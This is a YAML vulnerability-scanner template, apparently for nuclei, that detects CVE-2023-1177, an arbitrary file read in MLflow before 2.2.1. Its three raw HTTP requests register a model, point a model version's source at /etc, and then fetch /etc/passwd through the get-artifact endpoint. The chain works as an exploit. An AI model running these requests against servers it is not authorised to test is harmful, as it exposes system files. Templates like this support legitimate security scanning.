id: CVE-2023-1177

info:
  name: MLflow get-artifact 任意文件读取漏洞
  author: zan8in
  severity: high
  description: |
    使用 MLflow 模型注册表托管 MLflow 开源项目的用户 mlflow server或者 mlflow ui使用早于 MLflow 2.2.1 的 MLflow 版本的命令如果不限制谁可以查询其服务器（例如，通过使用云 VPC、入站请求的 IP 白名单或身份验证 /授权中间件）
    app="MLflow"
  tags: MLflow

flow: |
  http("r0") && http("r1") && http("r2")

http:
  - id: "r0"
    raw:
      - |
        POST /ajax-api/2.0/mlflow/registered-models/create HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"name": "testfile"}
        

  - id: "r1"
    raw:
      - |
        POST /ajax-api/2.0/mlflow/model-versions/create HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"name": "testfile", "source": "/etc"}
        

    matchers:
      - type: dsl
        internal: true
        dsl:
          - contains(body,"\"model_version\":") && contains(body,"\"source\":") && contains(body,"\"/etc\",")
        condition: and

  - id: "r2"
    raw:
      - |
        GET /model-versions/get-artifact?path=passwd&name=testfile&version=1 HTTP/1.1
        Host: {{Hostname}}

        

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "root:.*?:[0-9]*:[0-9]*:"
        part: body

